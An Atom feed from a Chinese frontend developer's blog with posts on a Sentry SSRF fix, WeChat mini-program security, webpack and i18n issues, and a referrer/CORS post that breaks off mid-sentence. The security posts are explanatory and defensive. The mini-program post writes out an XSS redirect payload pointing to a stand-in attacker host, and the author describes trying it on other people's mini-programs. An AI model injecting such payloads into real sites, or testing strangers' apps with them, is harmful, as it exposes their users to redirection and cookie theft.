<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Eva&#39;s Blog</title>
  
  <subtitle>进一寸有一寸的欢喜</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://evacoder.com/"/>
  <updated>2019-06-05T07:12:09.170Z</updated>
  <id>https://evacoder.com/</id>
  
  <author>
    <name>Eva</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>「 安全 」从Sentry安全问题说到SSRF攻击</title>
    <link href="https://evacoder.com/2019/06/04/sentry_Vulnerability/"/>
    <id>https://evacoder.com/2019/06/04/sentry_Vulnerability/</id>
    <published>2019-06-04T11:37:12.000Z</published>
    <updated>2019-06-05T07:12:09.170Z</updated>
    
    <content type="html"><![CDATA[<p>最近有白帽反馈了接入Sentry的安全漏洞，坏人可以进行SSRF攻击（Server-Side Request Forgery），其实还是挺普遍的，让我们来了解下。<br><a id="more"></a></p><p>漏洞详情：<a href="https://hackerone.com/reports/374737" target="_blank" rel="noopener">https://hackerone.com/reports/374737</a></p><p>前端小伙伴都很熟悉CRSF（Cross-site request forge ）跨站脚本攻击，主要是因为用户身份一般存在浏览器的cookie中，不同tab之间也能共享，只要坏人发出同域名的请求就可以携带cookie。</p><p>Forgery的意思是伪造，所以SSRF和CSRF有相通之处，都是坏人趁我们不注意让我们自己发了本来不想发及不该发的请求。</p><h4 id="Sentry漏洞的成因"><a href="#Sentry漏洞的成因" class="headerlink" title="Sentry漏洞的成因"></a>Sentry漏洞的成因</h4><p>分析了下Sentry漏洞的成因：</p><p>1.因为错误上报信息的接口是对外暴露的，所以坏人可以伪造任意的错误上报信息</p><p>2.Sentry中Enable JavaScript source fetching（源码预获取）的选项是默认打开的，这个选项的作用是去抓取上报的错误JSON中的stack trace中的filename对应的url对应的代码，所以部署sentry的服务器会盲目的GET请求坏人的url，坏人就达到了通过我们自己的服务器发起恶意请求的攻击目的，可以从外网来攻击内网（SSRF）<img src="/assets/sentry json.png" alt=""></p><p>3.同时我们最好配置下域名校验来过滤些无关的请求。<br>本来想说虽然配置了域名校验，坏人还是可以伪造refer和origin来直接发请求打挂我们的sentry，虽然打挂了也没啥可怕的，不影响线上服务。但是师父说了句很重要的观点</p><blockquote><p>攻防对抗就是成本的对抗，攻击成本高，收益小的话也不会被认为是安全问题</p></blockquote><p>简言之没人吃饱了没事儿发起这样的攻击。</p><p>修复方案也很简单，1.参照下图关闭源码抓取即可</p><p><img src="/assets/SentryCode.png" alt=""></p><p>2.最好限制下允许的域名</p><h4 id="其他关闭源码抓取的原因"><a href="#其他关闭源码抓取的原因" class="headerlink" title="其他关闭源码抓取的原因"></a>其他关闭源码抓取的原因</h4><p>其实官方也推荐我们关闭源码抓取，原文在这里：<a href="https://blog.sentry.io/2018/07/17/source-code-fetching" target="_blank" rel="noopener">关闭源码抓取的三个原因</a></p><p>简单总结下：</p><ul><li>不一致性：</li></ul><p>其实源码抓取的原理是通过爬虫抓取代码，所以经常会出现让人疑惑的地方，比如我的网站有海外版和国内版，明明是海外版报错，但是Sentry抓取的源码显示的对应行数可能是国内版的。而且用户可能很久没刷新页面，源码抓取展示的错误不是最新的，并不能对应到真正报错的行数。</p><ul><li>不安全：<br>很多网站本来就不希望Sentry这样的爬虫来爬，可能会有反爬策略，这样Sentry的爬虫就完全无法work。</li></ul><p>所以最佳实践是<strong>手动在Sentry中上传sourcemap</strong>，暴露在外的sourcemap也很可能会造成源码泄漏，上传在Sentry是最好的选择。</p><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>再简单介绍下SSRF吧。以下内容来自 <a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf/" target="_blank" rel="noopener">CTF Wiki</a><br>Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><p>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>攻击运行在内网或本地的应用程序（比如溢出）</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li><li>利用<code>file</code>协议读取本地文件等</li></ol><h4 id="SSRF-漏洞出现的场景"><a href="#SSRF-漏洞出现的场景" class="headerlink" title="SSRF 漏洞出现的场景"></a>SSRF 漏洞出现的场景</h4><ul><li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li></ul><p>这次的问题使我们了解了SSRF，通过外网来打内网服务，之前没关注到的领域，以后可以留个心眼儿。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近有白帽反馈了接入Sentry的安全漏洞，坏人可以进行SSRF攻击（Server-Side Request Forgery），其实还是挺普遍的，让我们来了解下。&lt;br&gt;
    
    </summary>
    
    
      <category term="Security" scheme="https://evacoder.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>「 Problems 」页面引用不同版本webpack打包的js导致的问题</title>
    <link href="https://evacoder.com/2019/06/03/webpack_debug/"/>
    <id>https://evacoder.com/2019/06/03/webpack_debug/</id>
    <published>2019-06-03T14:51:35.000Z</published>
    <updated>2019-06-05T07:13:05.354Z</updated>
    
    <content type="html"><![CDATA[<p>一次页面引用不同版本webpack打包的js导致的问题。<br><a id="more"></a></p><p>业务反馈接入js sdk遇到报错</p><blockquote><p>cannot read property ‘bind’ of undefined</p></blockquote><p>线上代码有压缩混淆，所以先本地代理debug下，<code>webpack -d</code>来打包非压缩有sourcemap的版本，在chrome devTool中定位到具体的行数，发现并不是我们自己的代码报错，而是webpack打包过程生成的代码报错：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.webpackJsonP = <span class="built_in">window</span>.webpackJsonP || []</span><br><span class="line"><span class="built_in">window</span>.webpackJsonP.push.bind()...</span><br></pre></td></tr></table></figure></p><p><code>window.webpackJsonP.push</code>为undefined，对比sdk执行正常的页面webpackJsonP为[]，而报错业务的页面中webpackJsonP为function，所以是undefined的，怀疑是webpack版本的问题，询问后发现版本确实不一致，google发现有人遇到同样的问题<a href="https://github.com/webpack/webpack/issues/6985" target="_blank" rel="noopener">https://github.com/webpack/webpack/issues/6985</a></p><h4 id="问题总结："><a href="#问题总结：" class="headerlink" title="问题总结："></a>问题总结：</h4><p>如果在一个页面中引用了不同版本webpack打包的js可能会出现莫名其妙的报错，原因是webpack4中<code>window.webpackJsonP</code>为数组，而老版本<code>window.webpackJsonP</code>为函数。</p><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><p>配置webpack的output.jsonpFunction<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  output: &#123;</span><br><span class="line">    jsonpFunction:<span class="string">'specialWebpackJsonp'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>我们作为sdk提供方，为了从源头上避免此问题，最好设置特别的output.jsonpFunction</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一次页面引用不同版本webpack打包的js导致的问题。&lt;br&gt;
    
    </summary>
    
    
      <category term="Problems" scheme="https://evacoder.com/tags/Problems/"/>
    
  </entry>
  
  <entry>
    <title>「 微信开发 」深入分析微信小程序安全与管控</title>
    <link href="https://evacoder.com/2019/04/24/wechat_security/"/>
    <id>https://evacoder.com/2019/04/24/wechat_security/</id>
    <published>2019-04-24T10:27:12.000Z</published>
    <updated>2019-05-13T06:07:45.392Z</updated>
    
    <content type="html"><![CDATA[<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>写了那么多小程序，你思考过小程序的安全问题么？</p><p>为什么小程序支持跨域？</p><p>小程序中有xss，crsf攻击吗？</p><p>为什么小程序只支持request cookie，不支持response set cookie呢？</p><p>为什么小程序不支持动态加载js？什么叫动态加载js？eval和new Function有什么可怕之处？</p><p>真的没有绕过小程序审核热更新的方法吗？</p><p>小程序的登录设计有哪些安全考虑？</p><p>可以肉眼区分一个页面是小程序还是web-view吗？</p><p>今天我们就来深入理解小程序的安全设计和管控。</p><p>先限定下范围，虽然头条小程序，支付宝小程序，QQ小程序层出不穷，但本文主要从微信小程序说起。</p><p>小程序中也支持web-view，内嵌网页这类不在本文讨论范围之中，因为和浏览器是一样的，还是不支持跨域，会有XSS等。<br><a id="more"></a></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><strong>为什么小程序支持跨域？</strong></p><p>我通常和后端小伙伴这样解释，我们可以理解小程序是类似native的，所以不需要考虑跨域问题。</p><p>再解释清楚一点就是：小程序的网络请求是通过native的能力来中转后发出的，而不是直接在webview中发出的。</p><p>那我们再思考下，<strong>为什么native支持跨域而前端限制那么多？</strong></p><p>个人感觉原因如下：</p><p>1.因为前端代码是裸奔状态，用户（或者坏人）输入网址后F12就可以一览无余你的源码，而客户端的代码是编译好的，没那么容易被反编译，看清源码，所以webpack打包会生成source map，上线时最好删掉source map文件，否则坏人轻轻松松就能get到你的源码。</p><p>2.了解源码之后，前端代码存在各种被注入的可能性，一不小心就location.href到别的页面，一不小心就document.cookie获取走了cookie，或者给你做个假的登录页窃取你的密码，可以参照文章：<a href="https://www.evacoder.com/2019/02/15/iframe_security/" target="_blank" rel="noopener">万物皆可hook</a></p><p>3.浏览器tab页的存在，用户身份通常通过cookie来存储，即使tab页之间没有关系，坏人页面依然有办法窃取你的cookie。攻击形式太多样了，非常需要同源策略（跨域）的限制。</p><p>既然说到了cookie，小程序中有个重要的限制就是<strong>request中可以支持cookie但是response中不支持cookie</strong>，这又是什么考虑呢？</p><p>我们知道，在浏览器中发出请求时会自动携带该域名下的cookie，同域名的js，img，css请求都会带上cookie，但是因为小程序的网络请求是通过native来转发的，并不是之前常用的AJAX，小程序语法中我们必须手动在header中设置cookie。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wx.request(&#123;</span><br><span class="line">  method: <span class="string">'GET'</span>,</span><br><span class="line">  url: <span class="string">'evacoder.com/users'</span>,</span><br><span class="line">  data: &#123;&#125;,</span><br><span class="line">  header: &#123;</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="comment">// 设置cookie</span></span><br><span class="line">    <span class="string">'cookie'</span>: <span class="string">'userId=12345'</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>请求是native代为转发，那接受响应的实际是native，经过处理后再传递给webview，wx.request成功回调中没有返回cookie，小程序也直接禁用了DOM，BOM相关的所有方法，document.cookie根本无法调用，微信爸爸不提供cookie的返回咱也没办法。</p><p>发送cookie必须手动设置，获取不到document.cookie以及响应中的cookie，小程序中应该是<strong>不存在CSRF</strong>了。</p><p>当然还有更严格的限制，<strong>要调用某域名的接口必须在该域名下放校验文件</strong>，所以不经过同意别人的小程序没法调用你的接口，在你的小程序坏人也没法把窃取到的信息发到他的域名。</p><p><strong>小程序是否存在xss呢？</strong></p><p>xss即js代码注入，前端要做的是不信任任何用户的输入，将所有的特殊字符如&lt;&gt;/%都进行过滤，尽量不要使用eval，innerHTML。比如在博客留言中留下<code>&lt;script&gt;location.href=&#39;https://badman.com&#39;&lt;/script&gt;</code>后，这样每个访问这个页面的人都会被导流到坏人的页面（或者被窃取cookie等造成损失）。</p><p>我觉得总会有些小白不过滤吧，试了几个没啥用户的个人小程序，填写<code>&lt;script&gt;location.href=&#39;https://badman.com&#39;&lt;/script&gt;</code>果然可以提交成功，但重新进入这个页面并没有跳转到badman页面。</p><p>小程序最终也是编译成了html，DOM中的&lt;script&gt;确确实实是存在的，难道有啥奇妙之处？</p><p>其实原因很简单，数据绑定模版语法大多类似，框架将我们写的<code></code>展示在页面中是通过<strong>innerText而不是innerHTML</strong>，所以即使没有过滤也依然无法注入成功。</p><p>但是还是要注意，小程序中如果忘记过滤特殊字符，<strong>在网页中接口返回后XSS就可以成功了</strong>，这就是所谓的<strong>存储型XSS</strong>，有时候小程序上线求快，可能会防范比较薄弱，所以前后端都要好好过滤（最重要的当然是后端过滤）。</p><p>前面说到使用了innerText而未使用innerHTML，博客评论及论坛帖子这种富文本编辑器因为使用了innerHTML所以一向是xss的重灾区，在小程序中呢？</p><p>小程序中也提供了富文本 <a href="https://developers.weixin.qq.com/miniprogram/dev/component/rich-text.html" target="_blank" rel="noopener">rich-text组件</a>，但是明确规定了只接受受信任的标签，当然是没有<code>&lt;script&gt;</code>的。</p><p>但是极端一点如果小白把用户的输入eval了怎么办呢？</p><p>不用担心，小程序也<strong>不支持eval和new Function动态加载</strong>。</p><p>其实当然不是为了防止小白犯傻，更重要的是为了防止有人热更新动态加载，绕过审核，整个小程序是个壳，通过请求来返回非法内容把小程序改的面目全非。但是看到这篇 <a href="https://zhuanlan.zhihu.com/p/34191831" target="_blank" rel="noopener">懂编译原理真的可以为所欲为</a> 貌似还是有方法可以绕过，但是一般开发者暂时不会这么做，暂时没有仔细研究。</p><p>就目前来看，常见的xss已经被封死，可能还有没想到的欢迎评论补充。</p><p><strong>有办法肉眼区分一个页面是小程序还是web-view吗?</strong></p><p>可能网页在性能差的手机上渲染的慢一点，不要提肉眼区分，服务端都没有好办法直接判断。因为iOS的UA不规范，根本无法区分是小程序还是微信的浏览器。（所以说一开始多花点时间讨论再开工，不然要累死客服啊），请大家补充。</p><p><strong>小程序编译完之后变成了什么？</strong></p><p>编写小程序是使用类似HTML，JS，CSS的WXML，WXSS，JS来编写的，因为RN不稳定等原因，小程序最终没有选择类似RN的采用客户端native渲染，而是采用了Web技术渲染，加上原生接口来提供原生能力，所以小程序最终还是打包成HTML运行在浏览器中。因为浏览器不识别小程序语言，所以需要一个编译过程，大概理解起来就相当于有wxml-loader，wxss-loader通过webpack打包成pp-service.js后，插入在一个page-frame的html中。</p><p>我们可以抓包看到小程序的refer是<a href="https://servicewechat.com/{APPID}/{VERSION}/page-frame.html。" target="_blank" rel="noopener">https://servicewechat.com/{APPID}/{VERSION}/page-frame.html。</a></p><p>小程序的写法和vue相似，但是vue中js，html，css可以写在一个vue文件中，但是小程序中必须拆分为三个文件，会不会有些多余呢？</p><p>实际上这正是小程序的安全设计的用心之处，<strong>区分视图层和逻辑层，采用双线程的设计</strong>。（其实也可以一个页面，编译时做拆分即可，不过三个文件也更灵活）。</p><p>官方提供的编译过程</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 【WXML】编译后得到以下函数，根据路径和数据自动生成virtualDom，然后通过组件系统比对差异渲染页面</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$gwx</span>(<span class="params">pagePath</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">pageData</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据页面路径获取页面结构生成函数</span></span><br><span class="line"><span class="keyword">var</span> generateFun = $gwx(<span class="string">'name.wxml'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面结构生成函数从【js】接受页面数据，得到描述页面结构的JSON</span></span><br><span class="line"><span class="keyword">var</span> virtualTree = generateFun(&#123;</span><br><span class="line">  name: <span class="string">'Eva'</span>,</span><br><span class="line">  age: <span class="string">'6'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* virtualTree == &#123;</span></span><br><span class="line"><span class="comment">  tag: 'view'，</span></span><br><span class="line"><span class="comment">  children: [&#123;</span></span><br><span class="line"><span class="comment">    tag: 'view',</span></span><br><span class="line"><span class="comment">    children: ['name:Eva', 'age:6']</span></span><br><span class="line"><span class="comment">  &#125;]</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 小程序组件系统在虚拟树对比后将结果渲染到页面上</span></span><br><span class="line">virtualDom.render(virtualTree)</span><br></pre></td></tr></table></figure><p>视图层通过WebView浏览器环境，逻辑层通过JsCore来执行。</p><p><strong>视图层</strong>包括WXML和WXSS，使用<strong>WebView</strong>加载page-frame.html，在确定页面路径之后，WXML和WXSS文件生成了JS函数generateFun，结合逻辑层的页面数据得到virtualTree，小程序组件系统在虚拟树对比后将结果渲染到页面上。</p><p><strong>逻辑层</strong>中包括所有JS代码，主要是页面的数据，和点击事件等处理，所有JS编译成appService.js。</p><p>逻辑层和视图层常见的三种交互情况：</p><p>初次渲染：逻辑层将pageData和pagePath等通过Native传给视图层来渲染页面。</p><p>更新数据：逻辑层发送数据给视图层</p><p>用户事件：视图层收到用户事件根据绑定事件回调函数来反馈给逻辑层</p><p>为啥要区分逻辑层和视图层呢？</p><blockquote><p>基于Web 技术来渲染小程序是存在一些不可控因素和安全风险的。这是因为Web技术是非常开放灵活的，我们可以利用JavaScript 脚本随意地跳转网页或者改变界面上的任意内容。</p></blockquote><p>开发者可以做的事太多了，比如现在用户授权必须用户手动点按钮，但是如果可以DOM操作开发者直接就能跳过这一步获取用户敏感信息了。而且会存在前面提到的很多的安全隐患。</p><p>逻辑层使用的JsCore只是一个单纯的脚本解析器，浏览器中的BOM对象无法使用，正好可以完美解决这个问题。开发者工具并不是使用了真正的JSCore，而是直接用一个webview，有个很巧妙的设计，将开发者的代码包裹在define域的时候，<strong>将浏览器的BOM对象局部变量化</strong>，从而使得在开发阶段就能发现问题。</p><p>如果在渲染层写了script代码，在webpack处理时因为不符合规范应该会直接被过滤，或者会报错无法执行。</p><p>如果在逻辑层写了操作DOM的方法，因为JSCore环境下不识别，所以也会报错。</p><h4 id="官方论证"><a href="#官方论证" class="headerlink" title="官方论证"></a>官方论证</h4><p>其实上面的问题官方都公布了答案：<a href="https://developers.weixin.qq.com/ebook?action=get_post_info&amp;token=935589521&amp;volumn=1&amp;lang=zh_CN&amp;book=miniprogram&amp;docid=000e84889907c00b0086b0a2f5b40a" target="_blank" rel="noopener">深入理解小程序架构</a>。</p><p>这里真的有很多宝藏，快去探索吧。</p><p>通过上文的分析，小程序通过这些限制来保证了安全和管控：</p><p>1.逻辑层和渲染层的双线程架构</p><p>2.不支持eval和new Function动态加载</p><p>3.请求域名校验</p><p>这篇文章的篇幅已经很长了，关于小程序的登录安全设计，我们将在下篇文章中介绍。</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;思考&quot;&gt;&lt;a href=&quot;#思考&quot; class=&quot;headerlink&quot; title=&quot;思考&quot;&gt;&lt;/a&gt;思考&lt;/h4&gt;&lt;p&gt;写了那么多小程序，你思考过小程序的安全问题么？&lt;/p&gt;
&lt;p&gt;为什么小程序支持跨域？&lt;/p&gt;
&lt;p&gt;小程序中有xss，crsf攻击吗？&lt;/p&gt;
&lt;p&gt;为什么小程序只支持request cookie，不支持response set cookie呢？&lt;/p&gt;
&lt;p&gt;为什么小程序不支持动态加载js？什么叫动态加载js？eval和new Function有什么可怕之处？&lt;/p&gt;
&lt;p&gt;真的没有绕过小程序审核热更新的方法吗？&lt;/p&gt;
&lt;p&gt;小程序的登录设计有哪些安全考虑？&lt;/p&gt;
&lt;p&gt;可以肉眼区分一个页面是小程序还是web-view吗？&lt;/p&gt;
&lt;p&gt;今天我们就来深入理解小程序的安全设计和管控。&lt;/p&gt;
&lt;p&gt;先限定下范围，虽然头条小程序，支付宝小程序，QQ小程序层出不穷，但本文主要从微信小程序说起。&lt;/p&gt;
&lt;p&gt;小程序中也支持web-view，内嵌网页这类不在本文讨论范围之中，因为和浏览器是一样的，还是不支持跨域，会有XSS等。&lt;br&gt;
    
    </summary>
    
    
      <category term="微信开发" scheme="https://evacoder.com/tags/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>「 功能点 」国际化的一些思考和注意事项</title>
    <link href="https://evacoder.com/2019/04/18/i18n_thinking/"/>
    <id>https://evacoder.com/2019/04/18/i18n_thinking/</id>
    <published>2019-04-18T10:20:35.000Z</published>
    <updated>2019-05-27T03:47:10.523Z</updated>
    
    <content type="html"><![CDATA[<p>从后端国际化转向了使用vue-i18n前端国际化，不再会出现因为资源缺失导致的service error了，近期又全面整理了下国际化中踩过的坑，分享给大家。<br><a id="more"></a></p><h3 id="和翻译同学的合作"><a href="#和翻译同学的合作" class="headerlink" title="和翻译同学的合作"></a>和翻译同学的合作</h3><p>翻译同学一般使用 <a href="https://crowdin.com" target="_blank" rel="noopener">https://crowdin.com</a> 来提交翻译，在crowdin提交之后会有脚本定时提交到gitlab的语言资源项目中，开发同学可以通过脚本将语言资源copy到自己的实际项目中，但是要注意需要等翻译<strong>100%</strong>完成时才进行copy，不然会混杂着未翻译的文案给用户造成困扰。</p><p>和翻译同学合作需要注意以下几点：</p><h4 id="1-注意尽量不要使用拼接的字符串"><a href="#1-注意尽量不要使用拼接的字符串" class="headerlink" title="1.注意尽量不要使用拼接的字符串"></a>1.注意尽量不要使用拼接的字符串</h4><p>比如：</p><p>tips=请同意隐私政策和用户协议</p><p>千万不要因为用户协议和隐私政策需要在多处用到，就将字符串切分为多个：</p><p>agreement=用户协议</p><p>privacy=隐私政策</p><p>notice=请同意</p><p>and=和</p><p>这样翻译同学会和莫名其妙，而且不同语言因为语序不一样，我们生硬的组合起来，展示在网页上的整句话会完全不可读。</p><h4 id="2-注意单复数的处理"><a href="#2-注意单复数的处理" class="headerlink" title="2.注意单复数的处理"></a>2.注意单复数的处理</h4><p>left_times=您还能发送{n}条短信</p><p>在其他语言中会有单复数的区分，1 message left，2 messages left。 在阿语中单复数的表达甚至有多达6种。 Android的resource是使用xml，处理单复数如下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plurals</span> <span class="attr">name</span>=<span class="string">"watch_face_count"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">item</span> <span class="attr">quantity</span>=<span class="string">"one"</span>&gt;</span>%1$d个手盘<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">item</span> <span class="attr">quantity</span>=<span class="string">"other"</span>&gt;</span>%1$d个手盘<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plurals</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>Web中暂时没有比较好的处理方法</p><h4 id="3-需要注意日期，金额等格式差异的处理"><a href="#3-需要注意日期，金额等格式差异的处理" class="headerlink" title="3.需要注意日期，金额等格式差异的处理"></a>3.需要注意日期，金额等格式差异的处理</h4><p>比如在中文中通常是年月日格式：2019-05-13，英语中日期格式是日月年 13-05-2019</p><h4 id="4-需要注意rtl语言的特殊ui处理"><a href="#4-需要注意rtl语言的特殊ui处理" class="headerlink" title="4.需要注意rtl语言的特殊ui处理"></a>4.需要注意rtl语言的特殊ui处理</h4><p>有很多语言，比如iw_IL，ar等语言习惯都是从左到右的书写习惯，此时除了需要加上 <code>body{direction:rtl}</code></p><p>其他的布局也需要注意将left和right互换。</p><h4 id="5-需要注意语言中单双引号的处理"><a href="#5-需要注意语言中单双引号的处理" class="headerlink" title="5.需要注意语言中单双引号的处理"></a>5.需要注意语言中单双引号的处理</h4><p>英语en_US，法语fr_FR，意大利语it_IT有单引号，iw_IL希伯来语中有双引号作为字符。</p><p>如果出现在js的字符串中，导致语法错误，程序直接无法运行，此时我们需要用上转义字符来避免问题。</p><p>写个脚本统一将单双引号进行html转译</p><table><thead><tr><th style="text-align:left">Character</th><th style="text-align:left">转义后</th></tr></thead><tbody><tr><td style="text-align:left"><code>&#39;</code></td><td style="text-align:left"><code>&amp;#39;</code>（因为 <code>&amp;apos;</code> 不兼容IE所以使用这个）</td></tr><tr><td style="text-align:left"><code>&quot;</code></td><td style="text-align:left"><code>&amp;quot;</code></td></tr></tbody></table><h4 id="6-需要注意某些语言过长的处理"><a href="#6-需要注意某些语言过长的处理" class="headerlink" title="6.需要注意某些语言过长的处理"></a>6.需要注意某些语言过长的处理</h4><p>有些语言，比如 <code>mr_IR</code> 一个单词就非常长，所以一点要做好超长的样式处理，能够做到自适应布局。</p><h3 id="对外提供页面原则"><a href="#对外提供页面原则" class="headerlink" title="对外提供页面原则"></a>对外提供页面原则</h3><p>国际化的实现通常有两种方案：</p><p>1.将每个语言打包成一个页面（index-en_US.html,index-fr_FR.html）</p><ul><li>通常使用在对于性能和白屏时间有要求的网站首页，采用后端渲染根据对应的语言去加载</li><li>或者每个语言的差异比较大，不能通过模版语法简单的key-value对应上</li></ul><p>2.同一个页面，根据_locale参数或cookie加载不同的语言包(en_US.json,fr_FR.json)</p><p>无论使用哪种方式，因为我们对外提供的页面需要被别的页面引用，<strong>不应该让每个引用的页面来处理语言和页面对应逻辑</strong>，即不应该直接提供zh_CN.html，en_US.html这样的路径，而应该提供一个中间页面index.html，有的locale并不能自动对应locale.html,需要作为页面提供者的我们根据参数_locale=${locale}或者cookie来自动跳转对应的语言版本统一处理。</p><h3 id="vue-i18n使用"><a href="#vue-i18n使用" class="headerlink" title="vue-i18n使用"></a>vue-i18n使用</h3><p><a href="https://kazupon.github.io/vue-i18n/zh/introduction.html" target="_blank" rel="noopener">Vue-i18n 文档</a> 已经很清楚而且现在也有翻译了，不再赘述，需要注意使用webpack延迟加载而不是直接加载全部。</p><p>一般情况下都是前端来维护国际化的资源文件，确实是一件费时费力枯燥无味的工作，但是在工作中切忌眼高手低，分配到你的工作一定要做好。随着业务发展，需要支持的语言的种类越来越多，为了方便维护，最开始就要考虑好上面的问题的解决方案。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从后端国际化转向了使用vue-i18n前端国际化，不再会出现因为资源缺失导致的service error了，近期又全面整理了下国际化中踩过的坑，分享给大家。&lt;br&gt;
    
    </summary>
    
    
      <category term="功能点" scheme="https://evacoder.com/tags/%E5%8A%9F%E8%83%BD%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>「 安全 」从 referrer 白名单说到CORS攻击点</title>
    <link href="https://evacoder.com/2019/03/19/refer_cors_sec/"/>
    <id>https://evacoder.com/2019/03/19/refer_cors_sec/</id>
    <published>2019-03-19T10:27:12.000Z</published>
    <updated>2019-05-27T03:46:40.834Z</updated>
    
    <content type="html"><![CDATA[<p>看到一个抢红包的活动页，准备把接口copy出来自动测试却发现403了，这种情况一般都是因为有 <code>referrer</code> 校验。我们也经常会通过 <code>referrer</code> 白名单来限制接口的盗用，今天来分析下可能存在的攻击点。</p><a id="more"></a><h4 id="referrer-为空的情况"><a href="#referrer-为空的情况" class="headerlink" title="referrer 为空的情况"></a><code>referrer</code> 为空的情况</h4><p> <code>referrer</code> 本来的作用是判断当前页面的来源页面的地址，通常用来统计分析，日志记录，或者可以记录下帮别人导流数量来收钱，但是在页面跳转中也存在没有  <code>referrer</code>  的的几种情况：</p><p>1.来源页面采用的协议为表示本地文件的 <code>file</code> 或者 <code>data</code> URI</p><p>2.当前请求页面采用的是非安全协议，而来源页面采用的是安全协议(HTTPS跳到HTTP)</p><p>3.直接在浏览器地址输入地址进入的页面，或<code>location.reload()</code>刷新会没有 <code>referrer</code> ，<code>location.href</code>或者<code>location.replace()</code> 有 <code>referrer</code> </p><p>4.代码设置禁止发送：<code>&lt;a rel=&quot;noreferrer&quot; href=&quot;https://evacoder.com/users&quot;&gt;</code>，<code>&lt;meta content=&quot;never&quot; name=&quot;referrer&quot;&gt;</code></p><p>前端虽然可以通过 <code>document.referrer</code> 获取 <code>referrer</code> ，但为了安全JS是无法修改 <code>referrer</code> 的。</p><p>那是否还有可攻击点呢？</p><p>当然！如果要进行 <code>referrer</code> 